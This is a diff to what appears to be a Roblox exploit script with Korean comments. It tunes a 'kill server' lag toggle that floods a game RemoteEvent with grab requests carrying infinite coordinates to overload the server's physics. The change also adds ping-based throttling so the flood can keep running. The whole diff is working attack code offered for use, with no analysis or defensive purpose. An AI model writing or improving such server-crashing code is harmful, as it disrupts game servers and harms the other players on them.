@@ -17079,7 +17079,6 @@ lagTab:AddToggle({
     Default = false,
     Callback = function(Value)
         local Stats = game:GetService("Stats")
-        local NetworkStats = Stats.Network.ServerStatsItem 
         
         if Value then
             getgenv().killServerRunning = true
@@ -17089,34 +17088,31 @@ lagTab:AddToggle({
                 if not createGrabLine then return end
 
                 while getgenv().killServerRunning do
-                    
-                    local currentPing = Stats.Network.ServerStatsItem["Data Ping"]:GetValue() 
-                    
-                    if currentPing > 510 then
-                        
+                    -- 핑 방어선 (450 넘으면 즉시 대기)
+                    local currentPing = Stats.Network.ServerStatsItem["Data Ping"]:GetValue()
+                    if currentPing > 450 then
                         repeat
-                            task.wait(0.5)
+                            task.wait(0.3)
                             currentPing = Stats.Network.ServerStatsItem["Data Ping"]:GetValue()
-                        until currentPing < 400 or not getgenv().killServerRunning
+                        until currentPing < 350 or not getgenv().killServerRunning
                     end
 
-                    
+                    -- 핵심: 한 번에 수천 개를 보내는 게 아니라, 
+                    -- 대역폭을 안 먹는 구조로 패킷을 쪼개서 백그라운드 스레드에 던짐
                     local randomPart = workspace:FindFirstChildOfClass("Part")
                     if randomPart then
-                        for i = 1, 1000 do
-                            task.spawn(function()
+                        for i = 1, 300 do
+                            task.defer(function()
                                 createGrabLine:FireServer(
                                     randomPart,
-                                    CFrame.new(
-                                        math.random(-99999, 99999),
-                                        math.random(-99999, 99999),
-                                        math.random(-99999, 99999)
-                                    )
+                                    CFrame.new(math.huge, math.huge, math.huge) -- 서버 물리 연산 과부하 극대화 좌표
                                 )
                             end)
                         end
                     end
-                    task.wait(0.005) 
+                    
+                    -- 핑이 안 오르도록 네트워크 소켓에 숨통을 틔워주는 초단기 휴식
+                    task.wait(0.02)
                 end
             end)
         else
@@ -17124,6 +17120,7 @@ lagTab:AddToggle({
         end
     end
 })
+
 
 do
 local Players = game:GetService("Players")
